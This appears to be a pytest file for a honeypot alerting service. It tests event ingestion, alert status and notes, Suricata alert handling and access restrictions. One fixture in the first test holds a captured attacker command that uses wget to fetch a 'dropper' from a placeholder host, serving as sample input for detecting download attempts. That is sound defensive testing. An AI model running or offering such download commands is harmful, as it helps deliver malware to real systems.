from aegis_nexus.app import create_app


def _app(tmp_path):
    return create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "secret",
    })


def test_ingestion_creates_evidence_backed_alert_and_alert_api_supports_lifecycle(tmp_path):
    client = _app(tmp_path).test_client()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "secret"},
        json={
            "honeypot": "ssh-1",
            "event_type": "command",
            "observed": {
                "source_ip": "203.0.113.40",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget http://example.invalid/dropper",
            },
        },
    )
    assert response.status_code == 201
    event_id = response.get_json()["id"]

    queue = client.get("/api/v1/alerts").get_json()["items"]
    assert len(queue) == 1
    alert = queue[0]
    assert alert["rule_id"] == "download_attempt"
    assert alert["severity"] == "medium"
    assert alert["confidence"] == 90
    assert alert["status"] == "new"
    assert alert["evidence"][0]["id"] == event_id

    patched = client.patch(
        f"/api/v1/alerts/{alert['id']}",
        json={"status": "investigating", "tags": ["validated"]},
    )
    assert patched.status_code == 200
    assert patched.get_json()["status"] == "investigating"

    noted = client.post(
        f"/api/v1/alerts/{alert['id']}/notes",
        json={"body": "Reviewing captured download command."},
    )
    assert noted.status_code == 201
    assert noted.get_json()["notes"][0]["body"] == "Reviewing captured download command."


def test_suricata_ingestion_creates_alert_without_attribution(tmp_path):
    client = _app(tmp_path).test_client()
    response = client.post(
        "/api/v1/integrations/suricata/eve",
        headers={"X-Aegis-Key": "secret", "X-Aegis-Sensor": "suricata-01"},
        json={
            "timestamp": "2026-09-23T10:00:00Z",
            "event_type": "alert",
            "src_ip": "203.0.113.41",
            "dest_ip": "192.0.2.10",
            "dest_port": 22,
            "proto": "TCP",
            "app_proto": "ssh",
            "flow_id": 424242,
            "alert": {"signature": "Test high severity", "signature_id": 42, "severity": 1},
        },
    )
    assert response.status_code == 201
    queue = client.get("/api/v1/alerts?severity=high").get_json()["items"]
    assert any(item["rule_id"] == "suricata_high_severity" for item in queue)
    item = next(item for item in queue if item["rule_id"] == "suricata_high_severity")
    serialized = str(item).lower()
    assert "threat_actor" not in serialized
    assert "attribution" not in serialized


def test_alert_api_rejects_invalid_status_and_sensor_network_access(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "secret",
        "SENSOR_SOURCE_CIDRS": {"ssh-1": "172.31.101.0/24"},
    })
    client = app.test_client()
    denied = client.get("/api/v1/alerts", environ_base={"REMOTE_ADDR": "172.31.101.10"})
    assert denied.status_code == 403

    missing = client.patch("/api/v1/alerts/not-found", json={"status": "bogus"})
    assert missing.status_code == 422
